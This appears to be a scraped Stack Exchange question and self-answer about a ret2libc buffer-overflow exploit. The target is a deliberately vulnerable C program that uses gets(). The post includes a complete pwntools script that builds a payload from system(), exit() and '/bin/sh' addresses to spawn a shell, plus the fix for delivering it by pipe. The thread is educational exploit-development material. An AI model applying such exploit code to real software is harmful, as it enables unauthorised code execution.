{
    "title": "ret2libc: problem getting exploit work without pwntools",
    "link": "https://reverseengineering.stackexchange.com/questions/29089/ret2libc-problem-getting-exploit-work-without-pwntools",
    "content": "I am trying to exploit this program <pre><code>test</code></pre> with ret2libc. Only NX is enabled.\n<pre><code>#include <stdio.h>\n\nvoid vuln() {\n    char buffer[256];\n    gets(buffer);\n}\n\nint main() {\n    vuln();\n    return 0;\n}\n</code></pre>\nI am able to exploit the program with pwntools, but I am unable to exploit it doing <pre><code>./test < myfile.txt</code></pre>.\nExploit:\n<pre><code>#!/bin/python3\nfrom pwn import process, gdb, shellcraft, p32, asm\nfrom pwnlib.util.cyclic import cyclic, cyclic_find\nimport os\n\nLOCAL_BIN = \"./test\"\nSYSTEM_ADDR = 0xf7e10420 # p system\nSHELL_ADDR = 0xf7f5a352 # find &system,+9999999,\"/bin/sh\"\nEXIT = 0xf7e02f80 # p exit\nOFFSET = 264 # offset to ebp\nP = process(LOCAL_BIN)\nG = gdb.attach(P.pid, \"b *0x080491c7\")\n\npayload = b''\npayload = payload.ljust(OFFSET, b'A')\npayload += b'BBBB' # fill ebp with \\x42\npayload += p32(SYSTEM_ADDR)\npayload += p32(EXIT)\npayload += p32(SHELL_ADDR)\n\n# write bytes to file. ./test < myfile.txt should work the same?\nwith open('myfile.txt', 'wb') as w:\n    w.write(payload)\n\nP.sendline(payload)\nP.interactive()\nexit()\n</code></pre>\nWhat is the difference from running pwntools and piping bytes into the program?\n",
    "votes": "0",
    "answers": 1,
    "views": "426",
    "tags": [
        "c",
        "buffer-overflow",
        "pwntools"
    ],
    "user": "Mr Krisey",
    "time": "Aug 3, 2021 at 1:50",
    "comments": [
        {
            "user": "Paweł Łukasik",
            "text": "\"I am unable to exploit it doing <pre><code>./test < myfile.txt</code></pre> - what's the effect of this not working?\n",
            "time": null
        },
        {
            "user": "Mr Krisey",
            "text": "I am not sure with what you mean with effects, but the program runs fine when I do it. No segfault or anything like that. I have even run both the programs side by side inside gdb. Look at this gyazo.com/e25632d05b9bed9a4fdf99fefde1e2b9. How can this fail? Eveything looks as it should...?\n",
            "time": null
        },
        {
            "user": "Mr Krisey",
            "text": "And since the program runs without fail (and that it enters the system function) I really can't see why it just runs <pre><code>system</code></pre> without giving a shell. It just runs without giving any output.\n",
            "time": null
        }
    ],
    "answers_data": [
        {
            "content": "It seems that I made two critical mistakes when I tried to use <pre><code>myfile.txt</code></pre> to exploit the binary.\n\nWhen writing the exploit to the file I did NOT append <pre><code>\n</code></pre> to the payload. <pre><code>P.sendline()</code></pre> appends this to the payload automatically. Without <pre><code>\n</code></pre> the function <pre><code>gets()</code></pre> just keeps asking for more input.\nThe second mistake was not to include the <pre><code>stdin</code></pre> when piping to <pre><code>myfile.txt</code></pre>. I am unsure about the specifics about this, but when running <pre><code>cat myfile.txt - | ./test</code></pre> I got the shell I wanted.\n",
            "votes": "1",
            "user": "Mr Krisey",
            "time": "Aug 4, 2021 at 8:47",
            "is_accepted": true,
            "comments": []
        }
    ]
}